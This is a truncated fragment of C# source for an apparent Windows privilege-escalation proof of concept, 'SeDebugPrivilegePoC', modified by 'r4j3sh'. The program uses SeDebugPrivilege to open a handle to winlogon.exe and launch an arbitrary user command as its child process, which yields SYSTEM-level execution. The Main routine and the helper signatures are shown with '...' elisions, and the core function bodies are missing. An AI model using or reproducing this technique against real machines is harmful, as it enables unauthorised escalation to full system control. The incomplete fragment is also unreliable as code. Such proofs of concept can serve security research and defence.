...
namespace SeDebugPrivilegePoC
{
    class SeDebugPrivilegePoC
    {
        ...
        static bool CreateProcessFromHandle(IntPtr hProcess, string command)
        {
            int error;
            bool status;
            int size = 0;
        ...
        static void Main(String[] args)
        {
            ...
            Console.WriteLine("[*] Modified by r4j3sh");
            Console.WriteLine("[*] Executing command: " + userCommand);
            Console.WriteLine("[*] If you have SeDebugPrivilege, you can get handles from privileged processes.");
            Console.WriteLine("[*] This PoC tries to Execute the command as a winlogon.exe's child process.");

            IntPtr hProcess = OpenWinlogonHandle();

            if (hProcess != IntPtr.Zero)
            {
                CreateProcessFromHandle(hProcess, userCommand);
